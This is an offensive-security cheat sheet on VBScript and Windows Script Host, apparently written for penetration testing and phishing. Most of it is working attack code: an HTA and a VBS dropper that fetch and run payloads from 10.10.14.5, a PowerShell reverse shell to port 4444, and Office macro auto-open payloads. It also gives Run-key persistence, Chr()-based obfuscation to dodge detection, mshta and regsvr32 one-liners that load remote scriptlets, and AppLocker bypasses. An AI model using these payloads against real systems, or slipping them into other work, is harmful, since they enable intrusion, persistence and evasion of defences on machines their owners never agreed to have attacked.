# VBScript / WSH

**Tags:** `#vbscript` `#wsh` `#windows` `#phishing` `#macros` `#lolbas` `#initialaccess`

VBScript (Visual Basic Script) runs via Windows Script Host (WSH) — `wscript.exe` (GUI) and `cscript.exe` (console). Primary use cases in offensive security: phishing payloads (.vbs, .hta, macro-based), Windows automation without PowerShell, WMI scripting, and legacy bypass techniques when PS is locked down.

**Run:** `cscript.exe script.vbs` (console) / `wscript.exe script.vbs` (silent/GUI)

> [!note]
> VBScript is disabled by default in Edge/IE and deprecated in Windows 11 24H2+. Still highly relevant for phishing (Office macros, .hta files) and older enterprise environments. HTA files run with elevated trust and full WScript access.

---

## HTA (HTML Application)

```html
<!-- shell.hta — runs with full WSH privileges, bypasses browser security -->
<html>
<head>
<script language="VBScript">
Sub Main()
    Dim oShell
    Set oShell = CreateObject("WScript.Shell")
    oShell.Run "powershell -nop -W hidden -ep bypass -c ""IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')""", 0, False
    Set oShell = Nothing
End Sub
</script>
<hta:application
    id="oHTA"
    applicationname="Update"
    border="none"
    borderstyle="none"
    caption="no"
    showintaskbar="no"
    singleinstance="yes"
    windowstate="minimize"
/>
</head>
<body onload="Main()">
</body>
</html>
```

```bash
# Deliver via email, phishing page, or UNC path
# mshta runs .hta
mshta http://10.10.14.5/shell.hta
mshta \\10.10.14.5\share\shell.hta
mshta C:\Temp\shell.hta

# Metasploit HTA server
use exploit/multi/handler
use auxiliary/server/mshta
```

---

## VBS Download & Execute

```vbscript
' Download file
Dim oHTTP, oStream
Set oHTTP = CreateObject("MSXML2.XMLHTTP")
oHTTP.Open "GET", "http://10.10.14.5:8000/payload.exe", False
oHTTP.Send

Set oStream = CreateObject("ADODB.Stream")
oStream.Type = 1  ' binary
oStream.Open
oStream.Write oHTTP.ResponseBody
oStream.SaveToFile "C:\Temp\payload.exe", 2  ' 2 = overwrite
oStream.Close

' Execute
Dim oShell
Set oShell = CreateObject("WScript.Shell")
oShell.Run "C:\Temp\payload.exe", 0, False

' One-liner equivalent (certutil is simpler — this avoids it)
```

---

## VBS Reverse Shell (PowerShell via VBS)

```vbscript
' Cradle into PS reverse shell via VBS
Dim oShell
Set oShell = CreateObject("WScript.Shell")
Dim cmd
cmd = "powershell -nop -W hidden -noni -ep bypass -c """ & _
      "$client=New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);" & _
      "$stream=$client.GetStream();" & _
      "[byte[]]$bytes=0..65535|%{0};" & _
      "while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){" & _
      "$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);" & _
      "$sendback=(iex $data 2>&1|Out-String);" & _
      "$sendbyte=([text.encoding]::ASCII).GetBytes($sendback+'PS '+(pwd).Path+'> ');" & _
      "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};" & _
      "$client.Close()"""
oShell.Run cmd, 0, False
```

---

## WMI via VBScript

```vbscript
' Execute command via WMI (local or remote)
Dim oWMI, oProcess
Set oWMI = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set oProcess = oWMI.Get("Win32_Process")
oProcess.Create "cmd.exe /c whoami > C:\Temp\out.txt", Null, Null, Null

' Remote execution
Set oWMI = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & _
           "TARGET\root\cimv2")
oProcess.Create "powershell -ep bypass -c IEX(...)", Null, Null, Null

' Query running processes
Dim oProcs, oProc
Set oProcs = oWMI.ExecQuery("Select * From Win32_Process")
For Each oProc In oProcs
    WScript.Echo oProc.Name & " PID:" & oProc.ProcessId
Next
```

---

## Office Macro Payload (VBA)

```vbscript
' Excel/Word macro — Auto-execute on open
Sub AutoOpen()    ' Word
    Payload
End Sub

Sub Auto_Open()   ' Excel
    Payload
End Sub

Sub Workbook_Open()   ' Excel (ThisWorkbook)
    Payload
End Sub

Sub Document_Open()   ' Word (ThisDocument)
    Payload
End Sub

Sub Payload()
    Dim oShell As Object
    Set oShell = CreateObject("WScript.Shell")
    Dim cmd As String
    cmd = "powershell -nop -W hidden -ep bypass -enc <BASE64_ENCODED_COMMAND>"
    oShell.Run cmd, 0, False
    Set oShell = Nothing
End Sub
```

---

## Registry Operations

```vbscript
' Read registry value
Dim oShell, regVal
Set oShell = CreateObject("WScript.Shell")
regVal = oShell.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName")
WScript.Echo regVal

' Write registry value (persistence)
oShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Update", _
                "C:\Temp\payload.exe", "REG_SZ"

' Delete registry key
oShell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Update"

' Read via WMI (more reliable for non-string types)
Dim oWMI, oReg
Const HKCU = &H80000001
Const HKLM = &H80000002
Set oWMI = GetObject("winmgmts:root/default")
Set oReg = oWMI.Get("StdRegProv")

' Get string value
Dim sValue
oReg.GetStringValue HKLM, "SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", sValue
WScript.Echo sValue
```

---

## File System Operations

```vbscript
Dim oFSO
Set oFSO = CreateObject("Scripting.FileSystemObject")

' Read file
Dim oFile, sContent
Set oFile = oFSO.OpenTextFile("C:\Users\user\Desktop\file.txt", 1)
sContent = oFile.ReadAll
oFile.Close

' Write file
Set oFile = oFSO.CreateTextFile("C:\Temp\output.txt", True)
oFile.WriteLine "line 1"
oFile.Close

' Check exists
If oFSO.FileExists("C:\Temp\payload.exe") Then
    WScript.Echo "File exists"
End If

' Copy / delete
oFSO.CopyFile "C:\source.txt", "C:\dest.txt"
oFSO.DeleteFile "C:\Temp\payload.exe"

' List directory
Dim oFolder, oFiles
Set oFolder = oFSO.GetFolder("C:\Users")
For Each oFiles In oFolder.SubFolders
    WScript.Echo oFiles.Name
Next
```

---

## Enumeration / Recon

```vbscript
' Current user
Dim oNet
Set oNet = CreateObject("WScript.Network")
WScript.Echo oNet.UserName & "@" & oNet.UserDomain

' Computer name
WScript.Echo oNet.ComputerName

' List drives
Dim oFSO, oDrives
Set oFSO = CreateObject("Scripting.FileSystemObject")
Set oDrives = oFSO.Drives
For Each oDrive In oDrives
    If oDrive.IsReady Then
        WScript.Echo oDrive.DriveLetter & ": " & oDrive.DriveType & " " & oDrive.FreeSpace
    End If
Next

' IP address
Dim oWMI, oAdapters, oAdapter
Set oWMI = GetObject("winmgmts:\\.\root\cimv2")
Set oAdapters = oWMI.ExecQuery("Select * From Win32_NetworkAdapterConfiguration Where IPEnabled = True")
For Each oAdapter In oAdapters
    For Each IP In oAdapter.IPAddress
        WScript.Echo IP
    Next
Next
```

---

## Obfuscation Techniques

```vbscript
' Chr() encoding — avoid string detection
' "WScript.Shell" → Chr(87)&Chr(83)&...
Dim oShell
Set oShell = CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108))

' String splitting
Dim s
s = "pow" & "ersh" & "ell"

' Variable variable function call
Dim funcName
funcName = "Run"
CallByName oShell, funcName, vbMethod, "cmd.exe", 0

' Execute encoded command (combine with PS encoder)
oShell.Run "pow" & Chr(101) & "rshell -enc <BASE64>", 0, False
```

---

## LOLBAS Execution (WSH)

```batch
rem Execute VBS
wscript.exe script.vbs
cscript.exe script.vbs //nologo

rem Execute JScript
wscript.exe script.js
cscript.exe script.js

rem Execute HTA (highest privilege)
mshta.exe shell.hta
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c calc"",0:close")
mshta.exe javascript:a=GetObject("script:http://10.10.14.5/payload.sct")

rem Execute via rundll32
rundll32.exe vbscript.dll,...

rem Execute via regsvr32 (scriptlet)
regsvr32 /s /n /u /i:http://10.10.14.5/payload.sct scrobj.dll

rem CSC / InstallUtil (CLM bypass)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /U payload.exe
```

---

## AppLocker / Script Block Bypass

```vbscript
' When PS is blocked but VBS/HTA isn't
' Use WMI Win32_Process.Create to spawn arbitrary processes
' Use Shell.Application ShellExecute for alternate execution

' Shell.Application bypass
Dim oShell
Set oShell = CreateObject("Shell.Application")
oShell.ShellExecute "powershell.exe", "-nop -ep bypass -c ""IEX...""", "", "open", 0

' WScript.Shell alternate
Set oShell = CreateObject("WScript.Shell")
oShell.Exec "cmd.exe /c whoami"
' (Exec shows console — use Run for hidden)
```

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
